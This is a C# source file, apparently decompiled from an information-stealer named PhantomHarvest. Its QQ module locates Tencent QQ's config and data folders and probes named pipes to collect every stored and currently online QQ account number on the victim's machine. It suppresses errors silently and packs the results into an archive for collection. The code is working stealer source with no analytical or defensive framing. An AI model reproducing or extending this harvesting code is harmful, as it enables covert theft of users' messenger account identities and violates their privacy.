using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using PhantomHarvest.Helper;

namespace PhantomHarvest.Messengers
{
	// Token: 0x02000016 RID: 22
	internal class QQ
	{
		public static void Collect(ArchiveManager zip)
		{
			try
			{
				string qq = QQ.get_qq();
				if (!string.IsNullOrEmpty(qq))
				{
					using (MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(qq)))
					{
						zip.AddStream(ArchiveManager.Compression.Deflate, QQ.MessengerName + "/QQ.txt", ms, DateTime.Now, "");
					}
				}
			}
			catch
			{
			}
		}

		public static string GetCommonDocumentsFolder()
		{
			int nFolder = 46;
			StringBuilder stringBuilder = new StringBuilder();
			Win32Api.SHGetFolderPath(IntPtr.Zero, nFolder, IntPtr.Zero, 0U, stringBuilder);
			return stringBuilder.ToString();
		}

		public static string get_qq()
		{
			List<string> list = new List<string>();
			List<string> list2 = new List<string>();
			string text = Path.Combine(QQ.GetCommonDocumentsFolder(), "Tencent\\QQ\\UserDataInfo.ini");
			if (File.Exists(text))
			{
				try
				{
					byte[] fileBytes = LockedFile.ReadLockedFile(text);
					if (fileBytes != null)
					{
						string content = Encoding.Default.GetString(fileBytes);
						Pixini pixini = Pixini.LoadFromMemory(content);
						
						string a = pixini.Get<string>("UserDataSavePathType", "UserDataSet", "1");
						string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Personal), "Tencent Files");
						if (a == "2")
						{
							path = pixini.Get<string>("UserDataSavePath", "UserDataSet", "");
						}
						
						if (Directory.Exists(path))
						{
							string[] array = Directory.GetDirectories(path);
							for (int i = 0; i < array.Length; i++)
							{
								string fileName = Path.GetFileName(array[i]);
								if (!fileName.Contains("All Users"))
								{
									list.Add(fileName);
								}
							}
						}
					}
				}
				catch
				{
				}
			}
			try
			{
				foreach (string text2 in Directory.GetFiles("\\\\.\\Pipe\\"))
				{
					if (text2.Contains("\\\\.\\Pipe\\QQ_") && text2.Contains("_pipe"))
					{
						list2.Add(text2.Replace("\\\\.\\Pipe\\QQ_", "").Replace("_pipe", ""));
					}
				}
			}
			catch {}

			StringBuilder stringBuilder = new StringBuilder();
			if (list.Count > 0)
			{
				stringBuilder.AppendLine("All QQ number:");
				stringBuilder.AppendLine(string.Join(" ", list.ToArray()));
			}
			if (list2.Count > 0)
			{
				stringBuilder.AppendLine("Online QQ number:");
				stringBuilder.AppendLine(string.Join(" ", list2.ToArray()));
			}
			return stringBuilder.ToString();
		}

		public static string MessengerName = "QQ";
	}
}
